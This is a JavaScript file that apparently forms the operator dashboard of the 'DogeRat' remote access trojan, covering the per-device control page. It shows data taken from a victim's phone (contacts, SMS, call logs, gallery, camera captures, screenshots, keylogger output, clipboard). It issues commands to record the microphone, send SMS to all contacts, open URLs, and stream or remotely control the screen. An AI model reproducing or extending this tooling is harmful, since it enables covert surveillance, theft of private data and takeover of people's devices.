// DogeRat Web Interface - Device Detail Page Logic

const socket = io();
let deviceId = null;
let deviceData = null;

// Screen viewer and remote control instances
let screenViewer = null;
let remoteControl = null;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  // Get device ID from URL
  const urlParams = new URLSearchParams(window.location.search);
  deviceId = urlParams.get('id');
  
  if (!deviceId) {
    showNotification('Device ID not found', 'error');
    setTimeout(() => window.location.href = '/', 2000);
    return;
  }
  
  // Setup tabs
  setupTabs();
  
  // Load device data
  loadDeviceData();
  
  // Setup Socket.IO listeners
  setupSocketListeners();
  
  // Initialize screen viewer and remote control
  initializeRemoteControl();
  
  // Refresh data every 5 seconds
  setInterval(loadDeviceData, 5000);
});

// Setup tab switching
function setupTabs() {
  const tabs = document.querySelectorAll('.tab');
  const contents = document.querySelectorAll('.tab-content');
  
  tabs.forEach((tab, index) => {
    // Click handler
    tab.addEventListener('click', () => {
      switchTab(tab);
    });
    
    // Keyboard navigation
    tab.setAttribute('tabindex', '0');
    tab.setAttribute('role', 'tab');
    tab.setAttribute('aria-selected', tab.classList.contains('active') ? 'true' : 'false');
    
    tab.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        switchTab(tab);
      } else if (e.key === 'ArrowRight') {
        e.preventDefault();
        const nextTab = tabs[index + 1] || tabs[0];
        switchTab(nextTab);
        nextTab.focus();
      } else if (e.key === 'ArrowLeft') {
        e.preventDefault();
        const prevTab = tabs[index - 1] || tabs[tabs.length - 1];
        switchTab(prevTab);
        prevTab.focus();
      }
    });
  });
  
  // Set ARIA attributes for tab panels
  contents.forEach(content => {
    const tabId = content.id.replace('tab-', '');
    const tab = document.querySelector(`[data-tab="${tabId}"]`);
    if (tab) {
      content.setAttribute('role', 'tabpanel');
      content.setAttribute('aria-labelledby', tab.id || `tab-${tabId}`);
    }
  });
}

// Switch to a specific tab
function switchTab(tab) {
  const targetTab = tab.dataset.tab;
  const tabs = document.querySelectorAll('.tab');
  const contents = document.querySelectorAll('.tab-content');
  
  // Remove active class from all tabs and contents
  tabs.forEach(t => {
    t.classList.remove('active');
    t.setAttribute('aria-selected', 'false');
  });
  contents.forEach(c => {
    c.classList.remove('active');
  });
  
  // Add active class to clicked tab and corresponding content
  tab.classList.add('active');
  tab.setAttribute('aria-selected', 'true');
  const content = document.getElementById(`tab-${targetTab}`);
  if (content) {
    content.classList.add('active');
  }
}

// Load device data from API
async function loadDeviceData() {
  if (!deviceId) return;
  
  try {
    // Show loading state
    const infoGrid = document.getElementById('device-info-grid');
    if (infoGrid) {
      infoGrid.innerHTML = `
        <div class="loading">
          <div class="spinner"></div>
          <p>Loading device information...</p>
        </div>
      `;
    }
    
    const response = await fetch(`/api/device/${deviceId}`);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    
    if (result.error) {
      showNotification(result.error, 'error');
      if (infoGrid) {
        infoGrid.innerHTML = `
          <div class="empty-state">
            <div class="empty-state-icon">⚠️</div>
            <h2>Failed to load device data</h2>
            <p>${escapeHtml(result.error)}</p>
            <button class="btn btn-primary" onclick="loadDeviceData()" style="margin-top: 15px;">Retry</button>
          </div>
        `;
      }
      return;
    }
    
    deviceData = result;
    renderDeviceInfo();
    renderDeviceData();
  } catch (error) {
    console.error('Error loading device data:', error);
    showNotification(`Error loading device data: ${error.message}`, 'error');
    
    const infoGrid = document.getElementById('device-info-grid');
    if (infoGrid) {
      infoGrid.innerHTML = `
        <div class="empty-state">
          <div class="empty-state-icon">⚠️</div>
          <h2>Failed to load device data</h2>
          <p>${escapeHtml(error.message)}</p>
          <button class="btn btn-primary" onclick="loadDeviceData()" style="margin-top: 15px;">Retry</button>
        </div>
      `;
    }
  }
}

// Render device information
function renderDeviceInfo() {
  if (!deviceData || !deviceData.info) return;
  
  const info = deviceData.info;
  
  // Update title
  const platform = info.platform || 'android';
  const platformIcon = platform === 'ios' ? '🍎' : '🤖';
  const platformBadge = `<span class="platform-badge platform-${platform}">${platformIcon} ${platform.toUpperCase()}</span>`;
  
  document.getElementById('device-title').innerHTML = `${info.model || 'Unknown Device'} ${platformBadge}`;
  document.getElementById('device-subtitle').textContent = 
    `${info.version} | ${info.ip} | ${info.online ? 'Online' : 'Offline'}`;
  
  // Render overview
  const infoGrid = document.getElementById('device-info-grid');
  if (infoGrid) {
    infoGrid.innerHTML = `
      <div class="data-item">
        <div class="data-item-label">Platform</div>
        <div class="data-item-value">${platformIcon} ${platform.toUpperCase()}${info.platformVersion ? ` (${info.platformVersion})` : ''}</div>
      </div>
      <div class="data-item">
        <div class="data-item-label">Device Model</div>
        <div class="data-item-value">${escapeHtml(info.model)}</div>
      </div>
      <div class="data-item">
        <div class="data-item-label">Version</div>
        <div class="data-item-value">${escapeHtml(info.version)}</div>
      </div>
      <div class="data-item">
        <div class="data-item-label">IP Address</div>
        <div class="data-item-value">${escapeHtml(info.ip)}</div>
      </div>
      <div class="data-item">
        <div class="data-item-label">Status</div>
        <div class="data-item-value">
          <span class="device-status ${info.online ? 'online' : 'offline'}">
            ${info.online ? 'Online' : 'Offline'}
          </span>
        </div>
      </div>
      <div class="data-item">
        <div class="data-item-label">Connected At</div>
        <div class="data-item-value">${formatDate(info.connectedAt)}</div>
      </div>
      <div class="data-item">
        <div class="data-item-label">Device ID</div>
        <div class="data-item-value">${info.id.substring(0, 16)}...</div>
      </div>
    `;
  }
}

// Render device data
function renderDeviceData() {
  if (!deviceData || !deviceData.data) return;
  
  const data = deviceData.data;
  
  // Render contacts
  if (data.contacts && data.contacts.length > 0) {
    renderContacts(data.contacts);
  }
  
  // Render SMS
  if (data.sms && data.sms.length > 0) {
    renderSMS(data.sms);
  }
  
  // Render calls
  if (data.calls && data.calls.length > 0) {
    renderCalls(data.calls);
  }
  
  // Render gallery
  if (data.gallery && data.gallery.length > 0) {
    renderGallery(data.gallery);
  }
  
  // Render camera captures
  if (data.camera) {
    if (data.camera.main && data.camera.main.length > 0) {
      renderCameraImages('main-camera-list', data.camera.main);
    }
    if (data.camera.selfie && data.camera.selfie.length > 0) {
      renderCameraImages('selfie-camera-list', data.camera.selfie);
    }
  }
  
  // Render screenshots
  if (data.screenshots && data.screenshots.length > 0) {
    renderScreenshots(data.screenshots);
  }
  
  // Render keylogger
  if (data.keylogger) {
    renderKeylogger(data.keylogger);
  }
  
  // Render clipboard
  if (data.clipboard) {
    document.getElementById('clipboard-display').textContent = data.clipboard;
  }
}

// Render contacts
function renderContacts(contacts) {
  const container = document.getElementById('contacts-list');
  if (!container) return;
  
  if (contacts.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No contacts available</p></div>';
    return;
  }
  
  container.innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>Name</th>
          <th>Phone</th>
          <th>Email</th>
        </tr>
      </thead>
      <tbody>
        ${contacts.map(contact => `
          <tr>
            <td>${escapeHtml(contact.name || 'Unknown')}</td>
            <td>${escapeHtml(contact.phone || 'N/A')}</td>
            <td>${escapeHtml(contact.email || 'N/A')}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// Render SMS
function renderSMS(smsList) {
  const container = document.getElementById('sms-list');
  if (!container) return;
  
  if (smsList.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No SMS messages available</p></div>';
    return;
  }
  
  container.innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>From</th>
          <th>To</th>
          <th>Message</th>
          <th>Date</th>
        </tr>
      </thead>
      <tbody>
        ${smsList.map(sms => `
          <tr>
            <td>${escapeHtml(sms.from || 'Unknown')}</td>
            <td>${escapeHtml(sms.to || 'Unknown')}</td>
            <td>${escapeHtml(sms.body || '')}</td>
            <td>${formatDate(sms.date)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// Render calls
function renderCalls(calls) {
  const container = document.getElementById('calls-list');
  if (!container) return;
  
  if (calls.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No call history available</p></div>';
    return;
  }
  
  container.innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>Number</th>
          <th>Type</th>
          <th>Duration</th>
          <th>Date</th>
        </tr>
      </thead>
      <tbody>
        ${calls.map(call => `
          <tr>
            <td>${escapeHtml(call.number || 'Unknown')}</td>
            <td>${escapeHtml(call.type || 'Unknown')}</td>
            <td>${call.duration || 'N/A'}</td>
            <td>${formatDate(call.date)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

// Render gallery
function renderGallery(gallery) {
  const container = document.getElementById('gallery-list');
  if (!container) return;
  
  if (gallery.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No gallery images available</p></div>';
    return;
  }
  
  container.innerHTML = gallery.map((item, index) => `
    <div class="image-item">
      <img src="${item.image || item.path || '#'}" alt="Gallery image ${index + 1}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%27200%27 height=%27200%27%3E%3Crect fill=%27%23333%27 width=%27200%27 height=%27200%27/%3E%3Ctext fill=%27%23999%27 font-family=%27sans-serif%27 font-size=%2714%27 x=%2750%25%27 y=%2750%25%27 text-anchor=%27middle%27 dy=%27.3em%27%3EImage%3C/text%3E%3C/svg%3E'">
      <div class="image-item-info">${formatDate(item.timestamp || item.date)}</div>
    </div>
  `).join('');
}

// Render camera images
function renderCameraImages(containerId, images) {
  const container = document.getElementById(containerId);
  if (!container) return;
  
  if (images.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No captures yet</p></div>';
    return;
  }
  
  container.innerHTML = images.map((item, index) => `
    <div class="image-item">
      <img src="${item.image || '#'}" alt="Camera capture ${index + 1}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%27200%27 height=%27200%27%3E%3Crect fill=%27%23333%27 width=%27200%27 height=%27200%27/%3E%3Ctext fill=%27%23999%27 font-family=%27sans-serif%27 font-size=%2714%27 x=%2750%25%27 y=%2750%25%27 text-anchor=%27middle%27 dy=%27.3em%27%3EImage%3C/text%3E%3C/svg%3E'">
      <div class="image-item-info">${formatDate(item.timestamp)}</div>
    </div>
  `).join('');
}

// Render screenshots
function renderScreenshots(screenshots) {
  const container = document.getElementById('screenshots-list');
  if (!container) return;
  
  if (screenshots.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No screenshots available</p></div>';
    return;
  }
  
  container.innerHTML = screenshots.map((item, index) => `
    <div class="image-item">
      <img src="${item.image || '#'}" alt="Screenshot ${index + 1}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%27200%27 height=%27200%27%3E%3Crect fill=%27%23333%27 width=%27200%27 height=%27200%27/%3E%3Ctext fill=%27%23999%27 font-family=%27sans-serif%27 font-size=%2714%27 x=%2750%25%27 y=%2750%25%27 text-anchor=%27middle%27 dy=%27.3em%27%3EImage%3C/text%3E%3C/svg%3E'">
      <div class="image-item-info">${formatDate(item.timestamp)}</div>
    </div>
  `).join('');
}

// Render keylogger
function renderKeylogger(keylogger) {
  const container = document.getElementById('keylogger-data');
  if (!container) return;
  
  // Update button states
  const onBtn = document.getElementById('keylogger-on-btn');
  const offBtn = document.getElementById('keylogger-off-btn');
  
  if (keylogger.enabled) {
    onBtn.classList.add('btn-primary');
    onBtn.classList.remove('btn-secondary');
    offBtn.classList.add('btn-secondary');
    offBtn.classList.remove('btn-primary');
  } else {
    onBtn.classList.remove('btn-primary');
    onBtn.classList.add('btn-secondary');
    offBtn.classList.remove('btn-secondary');
    offBtn.classList.add('btn-primary');
  }
  
  if (!keylogger.data || keylogger.data.length === 0) {
    container.innerHTML = '<div class="empty-state"><p>No keylogger data yet</p></div>';
    return;
  }
  
  container.innerHTML = `
    <div style="background: var(--bg-tertiary); padding: 15px; border-radius: 6px; font-family: monospace; font-size: 14px; max-height: 500px; overflow-y: auto;">
      ${keylogger.data.map(item => escapeHtml(item.text || '')).join('')}
    </div>
  `;
}

// Setup Socket.IO listeners
function setupSocketListeners() {
  socket.on('device-data-update', (data) => {
    if (data.deviceId === deviceId) {
      loadDeviceData();
    }
  });
  
  socket.on('device-disconnected', (device) => {
    if (device.id === deviceId) {
      showNotification('Device disconnected', 'warning');
      loadDeviceData();
    }
  });
}

// Action functions
function requestContacts() {
  executeAction('contacts');
}

function requestSMS() {
  executeAction('sms');
}

function requestCalls() {
  executeAction('calls');
}

function requestGallery() {
  executeAction('gallery');
}

function captureMainCamera() {
  executeAction('main-camera');
}

function captureSelfieCamera() {
  executeAction('selfie-camera');
}

function captureScreenshot() {
  executeAction('screenshot');
}

function toggleKeylogger(enabled) {
  executeAction(enabled ? 'keylogger-on' : 'keylogger-off');
}

function sendToast() {
  const text = document.getElementById('toast-text').value;
  if (!text) {
    showNotification('Please enter a message', 'warning');
    return;
  }
  executeAction('toast', [{ key: 'toastText', value: text }]);
  document.getElementById('toast-text').value = '';
}

function vibrateDevice() {
  const duration = parseInt(document.getElementById('vibrate-duration').value);
  if (!duration || duration < 1) {
    showNotification('Please enter a valid duration', 'warning');
    return;
  }
  executeAction('vibrate', [{ key: 'duration', value: duration }]);
  document.getElementById('vibrate-duration').value = '';
}

function sendSMS() {
  const number = document.getElementById('sms-number').value;
  const message = document.getElementById('sms-message').value;
  if (!number || !message) {
    showNotification('Please enter phone number and message', 'warning');
    return;
  }
  executeAction('sendSms', [
    { key: 'smsNumber', value: number },
    { key: 'text', value: message }
  ]);
  document.getElementById('sms-number').value = '';
  document.getElementById('sms-message').value = '';
}

function sendSMSToAll() {
  const text = document.getElementById('sms-all-text').value;
  if (!text) {
    showNotification('Please enter a message', 'warning');
    return;
  }
  executeAction('all-sms', [{ key: 'toastText', value: text }]);
  document.getElementById('sms-all-text').value = '';
}

function popNotification() {
  const text = document.getElementById('notification-text').value;
  if (!text) {
    showNotification('Please enter notification text', 'warning');
    return;
  }
  executeAction('popNotification', [{ key: 'text', value: text }]);
  document.getElementById('notification-text').value = '';
}

function openURL() {
  const url = document.getElementById('open-url').value;
  if (!url) {
    showNotification('Please enter a URL', 'warning');
    return;
  }
  // Validate URL format
  try {
    new URL(url);
    executeAction('open-url', [{ key: 'url', value: url }]);
    document.getElementById('open-url').value = '';
  } catch (e) {
    showNotification('Invalid URL format', 'error');
  }
}

function getClipboard() {
  executeAction('clipboard');
}

function recordMicrophone() {
  const duration = parseInt(document.getElementById('mic-duration').value);
  if (!duration || duration < 1 || duration > 300) {
    showNotification('Please enter a valid duration (1-300 seconds)', 'warning');
    return;
  }
  executeAction('microphone', [{ key: 'duration', value: duration }]);
  document.getElementById('mic-duration').value = '';
  showNotification(`Recording microphone for ${duration} seconds...`, 'success');
}

// Execute action on device
async function executeAction(action, params = []) {
  if (!deviceId) {
    showNotification('Device ID not found', 'error');
    return;
  }
  
  // Show loading state
  const originalNotification = showNotification('Sending action to device...', 'success');
  
  try {
    const response = await fetch(`/api/device/${deviceId}/action`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ action, params })
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    if (result.success) {
      showNotification('Action sent to device successfully', 'success');
      
      // Refresh device data after action (with delay)
      setTimeout(() => {
        loadDeviceData();
      }, 1000);
    } else {
      showNotification(result.error || 'Failed to execute action', 'error');
    }
  } catch (error) {
    console.error('Error executing action:', error);
    showNotification(`Error executing action: ${error.message}`, 'error');
  }
}

// Utility functions
function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function formatDate(dateString) {
  if (!dateString) return 'Unknown';
  try {
    const date = new Date(dateString);
    return date.toLocaleString();
  } catch (e) {
    return dateString;
  }
}

// Initialize screen viewer and remote control
function initializeRemoteControl() {
  try {
    // Wait for scripts to load
    setTimeout(() => {
      // Initialize screen viewer
      if (typeof ScreenViewer !== 'undefined') {
        screenViewer = new ScreenViewer('screen-viewer-container', deviceId, socket);
        
        // Initialize remote control after screen viewer canvas is created
        setTimeout(() => {
          if (typeof RemoteControl !== 'undefined' && screenViewer && screenViewer.canvas) {
            remoteControl = new RemoteControl(screenViewer.canvas, deviceId, socket, screenViewer);
          }
        }, 200);
      } else {
        console.warn('ScreenViewer class not found');
      }
    }, 100);
  } catch (error) {
    console.error('Error initializing remote control:', error);
  }
}

// Start screen streaming
async function startScreenStream() {
  if (!deviceId) return;
  
  try {
    const response = await fetch(`/api/v1/devices/${deviceId}/screen/start`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        quality: {
          fps: 15,
          resolution: 'half',
          compression: 75,
        },
      }),
    });
    
    const result = await response.json();
    if (result.success) {
      showNotification('Screen streaming started', 'success');
      document.getElementById('start-stream-btn').style.display = 'none';
      document.getElementById('stop-stream-btn').style.display = 'inline-block';
      updateStreamStatus('Streaming...', 0);
    } else {
      showNotification(result.error || 'Failed to start streaming', 'error');
    }
  } catch (error) {
    console.error('Error starting screen stream:', error);
    showNotification('Error starting screen stream', 'error');
  }
}

// Stop screen streaming
async function stopScreenStream() {
  if (!deviceId) return;
  
  try {
    const response = await fetch(`/api/v1/devices/${deviceId}/screen/stop`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    const result = await response.json();
    if (result.success) {
      showNotification('Screen streaming stopped', 'success');
      document.getElementById('start-stream-btn').style.display = 'inline-block';
      document.getElementById('stop-stream-btn').style.display = 'none';
      updateStreamStatus('Not streaming', 0);
    } else {
      showNotification(result.error || 'Failed to stop streaming', 'error');
    }
  } catch (error) {
    console.error('Error stopping screen stream:', error);
    showNotification('Error stopping screen stream', 'error');
  }
}

// Start remote control
async function startRemoteControl() {
  if (!deviceId || !remoteControl) return;
  
  try {
    const success = await remoteControl.start();
    if (success) {
      showNotification('Remote control started', 'success');
      document.getElementById('start-control-btn').style.display = 'none';
      document.getElementById('stop-control-btn').style.display = 'inline-block';
      updateControlStatus('Active');
    } else {
      showNotification('Failed to start remote control', 'error');
    }
  } catch (error) {
    console.error('Error starting remote control:', error);
    showNotification('Error starting remote control', 'error');
  }
}

// Stop remote control
async function stopRemoteControl() {
  if (!deviceId || !remoteControl) return;
  
  try {
    const success = await remoteControl.stop();
    if (success) {
      showNotification('Remote control stopped', 'success');
      document.getElementById('start-control-btn').style.display = 'inline-block';
      document.getElementById('stop-control-btn').style.display = 'none';
      updateControlStatus('Not active');
    } else {
      showNotification('Failed to stop remote control', 'error');
    }
  } catch (error) {
    console.error('Error stopping remote control:', error);
    showNotification('Error stopping remote control', 'error');
  }
}

// Reset view
function resetView() {
  if (screenViewer) {
    screenViewer.resetView();
  }
}

// Zoom in
function zoomIn() {
  if (screenViewer) {
    screenViewer.zoomIn();
  }
}

// Zoom out
function zoomOut() {
  if (screenViewer) {
    screenViewer.zoomOut();
  }
}

// Toggle fullscreen
function toggleFullscreen() {
  if (screenViewer) {
    screenViewer.toggleFullscreen();
  }
}

// Update stream status
function updateStreamStatus(status, fps) {
  const statusText = document.getElementById('stream-status-text');
  const fpsText = document.getElementById('stream-fps');
  if (statusText) statusText.textContent = status;
  if (fpsText) fpsText.textContent = fps;
  
  // Update FPS from screen viewer
  if (screenViewer && screenViewer.fps) {
    fpsText.textContent = screenViewer.fps;
  }
}

// Update control status
function updateControlStatus(status) {
  const statusText = document.getElementById('control-status-text');
  if (statusText) statusText.textContent = status;
}

// Listen for streaming status updates
socket.on('screen-stream-started', (data) => {
  if (data.deviceId === deviceId) {
    updateStreamStatus('Streaming...', 0);
  }
});

socket.on('screen-stream-stopped', (data) => {
  if (data.deviceId === deviceId) {
    updateStreamStatus('Not streaming', 0);
  }
});

socket.on('remote-control-started', (data) => {
  if (data.deviceId === deviceId) {
    updateControlStatus('Active');
  }
});

socket.on('remote-control-stopped', (data) => {
  if (data.deviceId === deviceId) {
    updateControlStatus('Not active');
  }
});

